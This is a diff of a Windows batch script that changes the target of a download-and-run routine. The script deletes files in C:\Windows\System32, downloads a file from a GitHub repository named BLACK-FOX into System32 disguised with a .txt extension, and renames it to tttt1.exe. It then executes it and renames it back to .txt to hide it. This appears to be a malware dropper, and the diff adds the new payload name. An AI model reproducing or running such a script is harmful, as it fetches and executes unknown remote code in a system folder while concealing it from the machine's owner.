@@ -12,18 +12,18 @@ if %errorlevel% neq 0 (
 )
 
 :: Step 1: Delete old files
-if exist "C:\Windows\System32\SNIPER90.dll" del /f /q "C:\Windows\System32\qwave"
+if exist "C:\Windows\System32\SNIPER90.dll" del /f /q "C:\Windows\System32\AWMS"
 if exist "C:\Windows\System32\tttt1.exe" del /f /q "C:\Windows\System32\tttt1.exe"
 
 :: Step 2: Download new file
-powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/BLACK89310/BLACK-FOX/raw/refs/heads/main/qwave' -OutFile 'C:\Windows\System32\qwave.txt' -ErrorAction Stop } catch { exit 1 }"
-if not exist "C:\Windows\System32\qwave.txt" (
+powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/BLACK89310/BLACK-FOX/raw/refs/heads/main/AWMS' -OutFile 'C:\Windows\System32\AWMS.txt' -ErrorAction Stop } catch { exit 1 }"
+if not exist "C:\Windows\System32\AWMS.txt" (
     echo [ERROR] Download failed!
     exit /b
 )
 
 :: Step 3: Rename DLL to EXE
-ren "C:\Windows\System32\qwave.txt" "tttt1.exe"
+ren "C:\Windows\System32\AWMS.txt" "tttt1.exe"
 
 :: Step 4: Execute
 start "" "C:\Windows\System32\tttt1.exe"
@@ -32,7 +32,7 @@ start "" "C:\Windows\System32\tttt1.exe"
 timeout /t 5 /nobreak >nul
 
 :: Step 6: Rename EXE back to DLL
-ren "C:\Windows\System32\tttt1.exe" "qwave.txt"
+ren "C:\Windows\System32\tttt1.exe" "AWMS.txt"
 
 :: Auto-exit
 exit
